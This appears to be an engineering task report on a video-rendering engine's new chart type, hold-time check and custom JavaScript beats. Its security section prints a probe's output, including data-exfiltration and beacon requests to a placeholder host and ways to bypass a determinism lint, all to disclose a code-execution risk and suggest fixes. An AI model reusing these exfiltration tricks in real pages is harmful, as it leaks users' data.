# Task 3 Report: `dumbbell`, `custom`, and the beat that runs out of time

**Phase:** 4 · **Branch:** `feat/video-phase-04-engine` · **Closes Phase 4**

**Mutation score: 21 / 21 killed** (11 from the brief's table, 10 from my own
sweep). Two of my own survived the first pass and are killed by two tests added
in the fourth commit; the brief's M2 needed restating before it was observable
at all — both are written up in section 3 rather than rounded off.

`RENDERABLE == set(BEAT_TYPES)` → **True**.

```
$ uv run python -c "from agenticsocial.video.script import RENDERABLE, BEAT_TYPES; ..."
RENDERABLE == set(BEAT_TYPES): True
['body', 'custom', 'dumbbell', 'jumpChart', 'kpis', 'list', 'quote', 'signoff', 'statement', 'title']
```

---

## 1. What I implemented

### Step 0 — a beat whose value animation cannot finish inside its hold

Refused, eagerly, in `engine/planbuild.js`. The requirement is computed by
`requiredHold(b)` from named constants that now live in `engine.js` and are used
by the animations themselves:

```js
const KPI_STAGGER=.62, KPI_COUNT_DUR=1.35;
const JUMP_STAGGER=.34, JUMP_GROW_D0=.5, JUMP_GROW_DUR=.8;
const DUMB_STAGGER=.22, DUMB_MOVE_D0=.28, DUMB_MOVE_DUR=.9;
```

`planbuild.js` owns only the two entrance offsets it passes as `d0` (`KPI_D0 =
0.35`, `JUMP_D0 = 0.3`, `DUMB_D0 = 0.55`) and reads everything after them from
those constants. That is the point of the exercise: two copies of `.62` agree
right up until somebody retimes the stack, and then the check passes beats that
end mid-count again while still printing `ok`. The tests that hold this move the
constant in a copied `engine.js` and assert the requirement follows — a test
that recomputed the formula in Python could not tell derived from retyped.

Verified end to end through the real CLI, at the hold the leader reported:

```
$ AGSOC_WORKSPACE=… uv run agsoc video preview 2026-08-17 --series the-brief --probe
the renderer failed (exit 1):
  page errors:
    Uncaught Error: beat 5 (kpis) holds 2s, but its value animation is still
    running at 2.94s — the last frame of the beat would freeze a mid-count
    figure that is in no source, no quote and no plan. Give it a hold of 2.94s
    or more, or fewer rows
```

The refusal names the beat (`beat 5 (kpis)`), the hold it has (`2s`) and the
hold it needs (`2.94s`). At `hold: 3.0` the same script renders.

**Why the bound is inclusive.** `hold >= needed`, not `>`. `render.mjs` writes
its last frame at `(round(total*30) - 1) / 30`, one frame short of the end, so a
hold exactly equal to the requirement leaves the count 1/30 s from done. The
easing is `EZ.quint` — at 1/30 s before the end of a 1.35 s count the remaining
error is `(0.0247)^5 ≈ 9e-9` of the target, which `Math.round`/`toFixed` swallow.
Exclusive here would refuse the hold the error message just told the operator to
type.

### `dumbbell`

Extracted into `engine.js` as `dumbbell(rows, d0, parent)` from the inline chart
in `content/2026-08-12.js`, with both properties that make the type exist:

* **No numeric axis, and no `scale` field.** There is no scale because there is
  nothing to scale against: a value is a fraction of the track. Nothing prints
  it. The required `footnote` renders, because it is the only place the reader
  is told what the markers mean.
* **Coincident values draw one `.dot merged`.** `gap` is derived (`a !== b`),
  never declared. The episode's fifth row-column is a boolean `up` that is
  exactly `a !== b`; as a field it could disagree with the numbers it describes,
  and `up: false` over two different ratings is the hidden-series failure with
  the schema's blessing.

Row shape, named for the first time: `{label, values[2], note?}`, `values`
positionally aligned to `series[2]`, checked into `[0, 1]` inclusive by a cross
check that mirrors `jump_rows_within_scale`.

### `custom`

* `buildCustom` compiles with `new Function('s', b.js)` **while the plan is
  walked**, so a syntax error is a build failure carrying the beat index rather
  than a page error at the frame that scene first appears on. The body runs in
  the page's global scope, which is what makes `E`, `P`, `rise`, `fade`, `an`,
  `EZ`, `clamp`, `lerp` available exactly as the committed episodes use them,
  and `s` is the scene root.
* `script.py` refuses a `js` containing `Date.now(`, `Math.random(` or
  `performance.now(`, and **says in the error that it is a lint, not a
  sandbox**.
* `custom` requires `attest`: a non-empty string. `agsoc video review` shows it
  in the text column **instead of** the `js`.

### Decisions that were mine, not the episode's or the spec's

| Decision | Why | Alternative rejected |
|---|---|---|
| Row shape `{label, values[2], note?}` | `values` pairs with `series[2]`, so nothing has to be remembered. Same mappings-not-tuples argument D-068 made for `jumpChart` | `{label, a, b}`; the engine's positional tuple, which is now an explicit wrong-type case |
| Positions are `[0, 1]` | The absence of `scale` in §7.1 is not an oversight — there is no axis to scale. So a value is a track fraction, and the engine's `v * 100 + '%'` makes the interval self-evident | Inferring a scale from the rows, which would make every chart full-width and the rule unfalsifiable |
| Dumbbell is subject to R1, but only for rows that **separate** | A merged marker is placed and revealed; it does not travel. A separating row animates one marker out of the other, and a half-drawn gap reads as "on par" on a row that is not — the only claim this chart makes is direction, and that is how it gets it wrong | Exempting the type (R1 says "count", and a dumbbell counts nothing) — see section 6 |
| The axis words `lower` / `higher →` | The type's whole semantics is direction; an unlabelled track does not say which end is good. They state no magnitude | An `axis` field — nothing in §7.1 has one, and inventing a required field is worse than two fixed words |
| The legend's third `both` swatch, drawn only when some row merges | The two-tone marker is unreadable without a key, and a key to a marker not on the card is noise | Always drawing it |
| `review` shows `attest`, not `js` | The column is ~40 characters. A clipped first line of JavaScript tells an approver nothing; the claim about what the beat shows is the only thing that column can usefully carry, and the code is in `script.yaml` | Joining both, which clips the attestation instead |
| The three lint patterns require a `(` | `Math.round` and an identifier `randomised` are not non-determinism, and a guard that refuses them teaches authors it is noise | A substring match on `random` (this is M9) |

**No new CSS.** Every class the dumbbell uses (`.chart`, `.crow`, `.lab`,
`.note`, `.note.up`, `.track`, `.dot.a`, `.dot.b`, `.dot.merged`, `.legend`,
`.legend i.split`, `.axis`, `.foot`) was already in `scene.html:112–133`, which
is what "the engine has CSS for it and no function" meant. No new dependencies.
No network in the Python suite.

**One prose/code disagreement flagged.** The brief's R1 and mutant table say
"count-up"; §6's first question presupposes the check also applies to
`jumpChart`, which counts nothing — its `shown` cell is static from frame 1.
I followed the question (jumpChart is checked) and extended the same reasoning to
`dumbbell`. Section 6 argues it rather than assuming it.

---

## 2. TDD evidence

Every step was RED first.

**Step 0** — `uv run pytest tests/test_video_planbuild.py -q -k "count or hold or requirement"`:

```
FAILED test_a_kpis_beat_whose_count_cannot_finish_in_its_hold_is_refused - AssertionError: buildFromPlan accepted the beat
FAILED test_the_refusal_names_the_beat_the_hold_it_has_and_the_hold_it_needs - AssertionError: buildFromPlan accepted the beat
FAILED test_the_requirement_ends_with_the_last_item_that_actually_counts - AssertionError: evalmachine.<anonymous>:1
FAILED test_the_requirement_moves_when_the_engines_stagger_does - AssertionError: evalmachine.<anonymous>:1
FAILED test_the_requirement_moves_when_the_engines_count_duration_does - AssertionError: evalmachine.<anonymous>:1
FAILED test_the_jumpchart_requirement_moves_with_the_engines_growth_duration - AssertionError: evalmachine.<anonymous>:1
6 failed, 7 passed, 72 deselected
```

**dumbbell** — `tests/test_video_planbuild.py tests/test_video_script.py`:
`30 failed, 369 passed` before the builder and the schema existed (13 renderer
assertions, 17 schema assertions).

**custom** — same two files: `17 failed, 312 passed` on the schema half;
`7 failed, 100 passed` on the renderer half.

**Final Python suite:**

```
$ uv run pytest -q
1238 passed, 1 warning in 12.98s
```

(The one warning pre-dates this task; the suite was `1152 passed, 1 warning`
at `bd1779a`.)

**Browser suite** — `node determinism.test.mjs`, exit 0:

```
  ok   day path t=0.5  81af9c119a6c 81af9c119a6c
  ok   day path t=0.5  chrome text stable from every predecessor
  ok   day path t=3.7  a9fc6922636a a9fc6922636a
  ok   day path t=3.7  chrome text stable from every predecessor
  ok   day path t=42.9  7494bbeaa15d 7494bbeaa15d
  ok   day path t=42.9  chrome text stable from every predecessor
  … plan path t=2.16 … t=32.16, each byte-identical and chrome-stable …
  ok   beat 0 (statement) renders its text
  ok   beat 1 (body) renders its text
  ok   beat 2 (list) renders its text
  ok   beat 3 (quote) renders its text
  ok   beat 4 (title) renders its text
  ok   beat 5 (title) renders its text
  ok   beat 6 (signoff) renders its text
  ok   beat 7 (kpis) renders its text
  ok   beat 8 (jumpChart) renders its text
  ok   beat 9 (dumbbell) renders its text
  ok   beat 10 (custom) renders its text
  ok   every builder has a fixture (10)
deterministic
```

**Both committed episodes still render:**

```
$ node render.mjs --day 2026-08-14 --probe
2026-08-14 · 119.99s · 3600 frames @ 30fps
25 probe frames → …/engine/probe

$ node render.mjs --day 2026-08-12 --probe
2026-08-12 · 119.97s · 3599 frames @ 30fps
24 probe frames → …/engine/probe
```

`2026-08-12` is the day with the real AMIE dumbbell. Its inline chart is
**unchanged** — see section 6.

---

## 3. Mutants

Each mutant was applied to the real file, the named test command run, and the
file restored. `KILLED` means the command exited non-zero.

| # | Mutation | Result | Killed by |
|---|---|---|---|
| M1 | count-fits-hold check dropped (`requireCountFitsHold` returns early) | **KILLED** | `test_a_kpis_beat_whose_count_cannot_finish_in_its_hold_is_refused` |
| M2 | check applied to beats with no count | **KILLED** (restated — see below) | 6 tests, incl. all six `test_a_beat_with_no_count_is_unaffected…` params |
| M3 | requirement hardcoded (`0.35 + last * 0.62 + 1.35`) rather than derived | **KILLED** | `test_the_requirement_moves_when_the_engines_stagger_does` |
| M4 | `dumbbell` renders row values as text (appended to `.note`) | **KILLED** | `test_a_dumbbell_renders_no_numbers` |
| M5 | `dumbbell.footnote` moved to `optional` | **KILLED** | `test_the_footnote_is_required_on_a_dumbbell` |
| M6 | coincident values draw two stacked dots (`gap = true`) | **KILLED** | `test_coincident_values_draw_one_two_tone_marker` |
| M7 | distinct values merged (`gap = false`) | **KILLED** | `test_distinct_values_draw_two_separate_dots` |
| M8 | `Date.now()` accepted (pattern removed) | **KILLED** | `test_a_custom_beat_that_reads_the_clock_or_the_dice_is_refused[Date.now()]` |
| M9 | the lint also rejects a harmless identifier containing "random" | **KILLED** | `test_a_harmless_identifier_is_not_refused` |
| M10 | `attest` optional | **KILLED** | `test_custom_requires_an_attestation` |
| M11 | `attest` required on `statement` too | **KILLED** | `test_no_other_type_requires_an_attestation` |

**M2 needed restating, and that is worth recording.** My first attempt made
`requiredHold` return `2.94` for every type it does not know — and it
**survived**, because `requireCountFitsHold` is only *called* from the three
builders that have a value animation. That mutant was unobservable: an equivalent
mutant, not a surviving one. The faithful version of "the check is applied to
beats with no count" is to hoist the call into `buildFromPlan` so it runs for
every beat, and that version is killed six times over. Recorded here rather than
scored as a pass, because "the mutant survived" and "the mutant could not have
been detected by anything" are different facts and only one of them is about the
tests.

### My own sweep

| # | Mutation | Result |
|---|---|---|
| S1 | requirement staggers from `items.length` rather than the last item that counts | **KILLED** |
| S2 | dumbbell row label set through `innerHTML` instead of `text` | **KILLED** |
| S3 | legend drops the second series | **KILLED** |
| S4 | dumbbell `[0,1]` cross check removed | **KILLED** |
| S5 | `buildCustom` returns a closure that never runs the js | **KILLED** |
| S6 | `custom` js compiled lazily, inside the closure, instead of eagerly | **KILLED** |
| S7 | `run()` called without the scene root | **KILLED** (after a new test — below) |
| S8 | `gap = a > b` instead of `a !== b` | **KILLED** (after a new test — below) |
| S9 | hold bound made exclusive (`hold > needed`) | **KILLED** |
| S10 | `review` shows `js` again instead of `attest` | **KILLED** |

**S7 and S8 survived the first pass.** Both were my tests being too narrow, and
both are real defects the suite would have shipped:

* **S8** — every dumbbell fixture in the file, including the AMIE chart itself,
  put the *first* series ahead (`0.82` vs `0.58`). `a !== b` and `a > b` are
  indistinguishable on that data. Under `a > b`, a row where the **second**
  entity rates higher merges: the chart draws "on par" over a real gap, hides a
  series, and reverses the finding. That is precisely M6's failure, reachable
  through a comparison operator instead of a constant.
  Fixed by `test_a_row_where_the_second_series_is_higher_also_separates`.
* **S7** — `test_the_custom_javascript_is_handed_the_scene_root` passed
  `{p: s}` to `E()`, and `E()` falls back to `opts.p || SC`. Inside a build
  closure those are the *same node*, so a builder that dropped the argument
  produced an identical tree. The test now reads `s.className` instead, which
  cannot pass without the argument.

Both tests are in the fourth commit, which is a test commit; the four-commit
shape is preserved.

---

## 4. Step 5 — every type at once, through `agsoc video preview`

A ten-beat script, one per catalogue type, in a fresh workspace.

`agsoc video review` (no "cannot be rendered yet" line, and no `!` in the margin
— which is Phase 4's exit criterion read off the operator's screen):

```
the-brief/2026-08-17 · draft · 10 beats · pace 1.0

     #  act  type        hold  text                                               src
     0       title        3.0  All ten beat types, in one episode
     1       statement    3.0  The model is <thinking> about **all ten types**
     2       body         3.0  AT&T raised prices &amp; nobody noticed, but *th…
     3       list         3.0  Tuned for **coding** & agents · Gemini API & AI…
     4       quote        3.0  “Gemini 3.7 Flash is our new workhorse model” —…
     5       kpis         3.0  $0.75 per 1M input tokens · $3.75 per 1M output…   [venturebeat]
     6       jumpChart    3.0  FrontierCode 1.1 · DeepSWE v1.1 · AutomationBenc…  [deepmind]
     7       dumbbell     4.0  Evaluators rated it **on par** with primary care…
     8       custom       3.0  Draws two lines of copy and no figures. — Ali Ab…
     9       signoff      3.0  Same time tomorrow.

holds 31.0s × pace 1.0 = runtime 31.0s
target 120s ± 8s · OUT OF TOLERANCE (-89.0s)
```

`agsoc video preview --probe` wrote ten probe frames with no page errors. Page
text, sampled at 0.95 of each beat's hold from the plan `agsoc` itself wrote:

```
--- beat 0 (title)  t=2.85s
THE BRIEF
2026-08-17
All ten beat types, in one episode
--- beat 1 (statement)  t=5.85s
STEP 5
The model is <thinking> about all ten types
--- beat 2 (body)  t=8.85s
AT&T raised prices &amp; nobody noticed, but the renderer did
--- beat 3 (list)  t=11.85s
LIVE TODAY IN
Tuned for coding & agents
Gemini API & AI Studio
<script> tags
The Spark agent
--- beat 4 (quote)  t=14.85s
Gemini 3.7 Flash is our new workhorse model
GOOGLE DEEPMIND
--- beat 5 (kpis)  t=17.85s
AND IT COSTS HALF OF WHAT 3.6 FLASH DID
$0.75
per 1M input tokens
$3.75
per 1M output tokens
50%
cheaper than 3.6 Flash
--- beat 6 (jumpChart)  t=20.85s
FrontierCode 1.1
34.4 → 43.6
DeepSWE v1.1
48–49 → 65.3
AutomationBench
17.0 → 30.4
GDP.pdf
22.0 → 34.0
Scores as published by Google, on a common 0–70% scale.
--- beat 7 (dumbbell)  t=24.80s
Evaluators rated it on par with primary care physicians
AMIE (video)
Primary care physician
both
History-taking
ON PAR
Diagnostic accuracy
ON PAR
Management
ON PAR
Communication quality
ON PAR
Eliciting physical signs
RATED HIGHER
LOWER
HIGHER →
Direction only — the source reports evaluator ratings, not published scores.
    [digits on the dumbbell card: none]
--- beat 8 (custom)  t=27.85s
Hand-built, and it still has to be seen
drawn by the beat itself
--- beat 9 (signoff)  t=30.85s
THE BRIEF
Same time tomorrow.
```

**The dumbbell shows no digits.** The check is a `/\d/g` match over the whole
card's `innerText`, not an eyeball: `none`. The same assertion is pinned in
`determinism.test.mjs` as the fixture's `forbid` list, so it fails a build rather
than a report.

Note beat 5: the KPI count has landed on `$0.75 / $3.75 / 50%`, not on a
mid-count figure, at a `hold` of 3.0 ≥ the 2.94 requirement. That is Step 0
working from the other end.

---

## 5. Files changed and commits

```
4d60185  fix: refuse a beat whose count-up cannot finish inside its hold
bc0af74  feat: draw the dumbbell, and keep the property that makes the type exist
bd6c0ad  feat: run custom beats, and require the attestation that stands in for a check
ca73d0c  test: every beat type on a real page, including the two that had no fixture
```

Full SHAs:

```
4d60185795f5281c603516c45016dc3ce9bbc50b
bc0af748bd3e0053d7eb2e8263a0eaf4128e742c
bd6c0ad51301ef9fbb3e5fad6cd1981dbcfb6356
ca73d0c14670d47c9fd447fc90eebe36dcc72b54
```

```
 engine/determinism.test.mjs       |  92 ++++++-
 engine/engine.js                  |  75 +++++-
 engine/planbuild.js               | 239 ++++++++++++++++++-
 src/agenticsocial/video/cli.py    |   7 +-
 src/agenticsocial/video/script.py | 214 +++++++++++++++--
 tests/test_video_plan.py          |  27 ++-
 tests/test_video_planbuild.py     | 481 ++++++++++++++++++++++++++++++++++++--
 tests/test_video_review.py        | 114 ++++++---
 tests/test_video_script.py        | 319 +++++++++++++++++++++++--
 9 files changed, 1463 insertions(+), 105 deletions(-)
```

`git status --porcelain -- src tests engine` is empty. Nothing under
`engine/content/` was touched; both committed episodes render byte-stably.

### The tests that had to be re-pointed, and why none were deleted

`RENDERABLE == set(BEAT_TYPES)` makes several gates unreachable through a valid
script: `plan.py`'s "valid but cannot be rendered yet", `review`'s `!` margin and
its "N beats cannot be rendered yet" footer. Every one of those tests now
**injects the narrower gate** (`monkeypatch.setattr(plan_mod, "RENDERABLE", …)`,
`monkeypatch.setattr(video_cli, "RENDERABLE", …)`) instead of being removed. The
gate is not dead code: the next type added to §7.1 is valid before anyone writes
its builder, and that is exactly when an operator needs to be told. A gate whose
test was deleted on the day it stopped firing is a gate that comes back broken.

One test got *wider* in the process:
`test_every_unrenderable_type_is_named_in_the_display` now parametrises over all
ten catalogue types with an empty gate, where it used to cover only the leftovers.

`test_a_type_with_no_builder_still_fails_loudly` had to move its exemplar
outside the catalogue (`sparkline`), because no catalogue type lacks a builder
any more. That narrows what it proves and I am flagging it: it now only covers a
handwritten plan, which is a real path (`render.mjs --plan` reads any JSON file,
`determinism.test.mjs` writes its own) but not the one it was written for.

---

## 6. Issues and concerns

### Is the count-fits-hold requirement computed correctly for `jumpChart` as well as `kpis`?

They stagger differently and I derive each from its own constants:

| type | binding animation | requirement |
|---|---|---|
| `kpis` | `count()` on the **last numeric** item | `0.35 + last*0.62 + 1.35` |
| `jumpChart` | the gain segment + `to` dot on the **last row** | `0.3 + (n-1)*0.34 + 0.5 + 0.8` |
| `dumbbell` | the marker separation on the **last row that separates** | `0.55 + last*0.22 + 0.28 + 0.9` |

Four honest caveats:

1. **`jumpChart` does not count.** Its `shown` cell is static HTML from frame 1,
   so a truncated jumpChart does not display a wrong *number* — it displays a bar
   that has not reached the number beside it. That is weaker than the kpis
   failure (a frame contradicting its own label rather than stating a false
   figure), and a purist reading of R1's "count-up" would exempt it. I check it
   because the bar is the encoding: a viewer reads the gain, and a gain drawn at
   70% of its authored size is a smaller improvement than the one in the source.
   §6's question presupposes jumpChart is checked, which is the reading I took.
2. **`dumbbell` is checked too, and that is my call, not the brief's.** Only rows
   that separate: a merged marker is placed and revealed, so there is nothing it
   can fail to finish (`test_a_dumbbell_whose_rows_all_coincide_is_unaffected_by_
   the_hold`). A separating row is the opposite case, and it is the one place
   this type can be wrong — a half-drawn gap reads as "on par" on a row that is
   not, which is the *only* claim the chart makes.
3. **The requirement covers figure-bearing animation only, not the footnote.**
   `buildJumpChart` fades its footnote in at `JUMP_D0 + n*0.34 + 0.6`, which for
   four rows is 2.76 s — *later* than the 2.62 s requirement. So a jumpChart held
   at exactly its minimum cuts the footnote's fade short, and the footnote is
   required because it changes what the chart claims. I did not extend the
   requirement to cover it: a partially-faded footnote is faint, not false, and
   the scene's own 0.34 s tail blurs everything out at every cut regardless — a
   requirement that included it would refuse holds that render correctly today.
   It is a legitimate thing to change your mind about, and it is one line
   (`after + 0.5` into `requiredHold`). The same applies to the dumbbell's axis
   and footnote, and to its `.note` cells, which fade at `t0 + 1.0` — later than
   the marker travel.
4. **A `kpis` beat with a mid-list numeric and a trailing string** requires only
   up to the last numeric item. That is right (`count()` is only called for
   numbers) and is pinned by
   `test_the_requirement_ends_with_the_last_item_that_actually_counts` — S1 in
   the sweep is the mutant that gets this wrong.

### `custom` executes author JS in the page. Beyond determinism, what can it actually do?

I measured this rather than reasoned about it — a probe beat inside a real
`render.mjs`-style page, with Playwright recording every network request. What
follows is output, not opinion:

```
typeof window: object
typeof fetch: function
typeof document: object
typeof crypto.getRandomValues: function
new Date().getTime() is a clock: 13 digits
can read engine globals: function/function     (count, requireExactAtDecimals)
can REPLACE engine globals: yes (reassigned count)
can reach chrome outside the scene: yes, #by text = "Ali Abdukarim"
can rewrite the source tag: yes
can set a CSS token: yes
can replace window.__seek: yes
can inject a style tag: yes
fires a network request: issued
image beacon: issued
reads a local file: BLOCKED — Fetch API cannot load file:///etc/hosts.
                    URL scheme "file" is not supported.

requests the page issued:
  https://example.invalid/exfil?d=1
  https://example.invalid/beacon.png
```

So, plainly:

* **It reaches the network.** Both requests left the browser — they failed only
  because the hostname does not resolve (`ERR_NAME_NOT_RESOLVED`), which is DNS
  answering, not a policy blocking. Cross-origin *reads* are stopped by CORS
  under a `file://` origin, but exfiltration does not need a read: a query string
  on an image is enough. `scene.html` has no CSP, and the renderer sets no
  `--disable-*` flags. **A custom beat can send the contents of the plan — the
  script, the sources, the byline — to a third party, and nothing in this
  codebase would notice.**
* **It reads and writes the whole `window`.** Not just its own card: the byline,
  the act chip, the source tag, the progress bar, the design tokens, `<head>`.
  It can rewrite the `src` chip to name a source the beat does not cite.
* **It can mutate other beats' rendering, retroactively.** Builders are
  *compiled* eagerly, but a scene's DOM is *built lazily*, the first frame it
  appears on. A custom beat at index 3 can reassign `count`, `E`, `escapeHTML`,
  `proseHTML` or `requireExactAtDecimals` — I confirmed the reassignment
  succeeds — and every beat built after it uses the replacement. That includes
  the guard that stops a `kpis` value being display-rounded and the escaping that
  stops prose being parsed as markup. **The Task 1 and Task 2 defects can be
  reintroduced from inside a script.yaml, after those checks have passed.**
* **It can escape the plan.** `window.__seek` and `window.__total` are writable;
  `render.mjs` calls exactly those. A custom beat can change what the renderer
  renders after the renderer has read the plan.
* **Non-determinism it can reach past the lint:** `new Date()` (no arguments —
  not one of the three spellings), `crypto.getRandomValues`, a module-level
  counter incremented per build, anything read out of the DOM,
  `window['Ma'+'th'].random()`. There is a test pinning the last of these as
  *accepted*, so the hole is written down rather than implied.

Local file reads via `fetch` are blocked by Chromium's scheme rule. I did **not**
test an `<iframe src="file:///…">` or a dynamic `import()` of a local path; I
would not claim those are blocked without measuring them.

**The lint is a lint.** It says so in the error text an operator sees and in the
docstring. It raises the floor for the author who reaches for `Math.random()` out
of habit; it is not a boundary and must not be cited as one. The actual control
on a `custom` beat is `attest` plus the human who reads it in `agsoc video
review` — which is honest about what it is (a person's signature) rather than
pretending to be a check. If this project ever accepts a `script.yaml` from
anywhere but its own operator, `custom` is remote code execution with a
filesystem-and-network-capable runtime, and the fix is a real boundary (a CSP on
`scene.html`, a `--host-resolver-rules` block, or executing the beat in a worker
with no DOM), not a longer regex. **The lint is not a defence against that and
I have not built one.**

Two smaller notes in the same area:

* The determinism lint lives in Python only, unlike `requireCitation`, which is
  duplicated in `planbuild.js` because "a plan can reach the page without passing
  through Python at all". I did not duplicate it: a lint that is not a boundary
  gains little from a second copy and loses the drift surface of two regexes in
  two languages. If that reasoning is wrong, the fix is ten lines in
  `buildCustom`. Flagged rather than quietly decided.
* `attest` travels into `plan.json` (it is a required field, and `plan.py` emits
  required fields), so the renderer is handed a string it has no business
  drawing. It does not draw it — `test_the_attestation_is_not_drawn_on_the_card`
  and the `forbid` list in `determinism.test.mjs` both pin that — but the cleaner
  shape would be for `plan.py` to withhold it, the way it withholds
  `claim_override`.

### Anything blocking `RENDERABLE == set(BEAT_TYPES)`?

Nothing. It is `True`, `BUILDERS` has ten keys, `determinism.test.mjs` reads
`Object.keys(BUILDERS)` off the live page and fails if any of them has no
fixture, and `test_every_renderable_type_has_a_builder` holds the two sets to
each other from the Python side.

Two things to carry into Phase 5:

1. **The AMIE chart in `content/2026-08-12.js` still builds its rows inline.**
   I extracted the primitive into `engine.js` without rewriting the episode, so
   the row-drawing logic now exists twice. Rewriting it would have changed the
   frames of a shipped video — the per-row offsets (`.55 + i*.22`), the
   `div-line` separator between the four "on par" rows and the fifth, and the
   axis wording are all episode-specific — and "the committed episode still
   renders" is one of this task's acceptance criteria. The duplicate is
   deliberate and is the honest cost of not touching a published render. If the
   episode is ever re-rendered, it should be ported to `dumbbell()` in the same
   commit and diffed frame-by-frame.
2. **The dumbbell's `div-line` separator has no field.** The episode uses it to
   split the rows that coincide from the row that does not, which is a real
   editorial device the primitive cannot express. Adding it would mean a new
   field (or deriving it, which would reorder rows — and this type keeps authored
   order deliberately). Not needed by anything today.
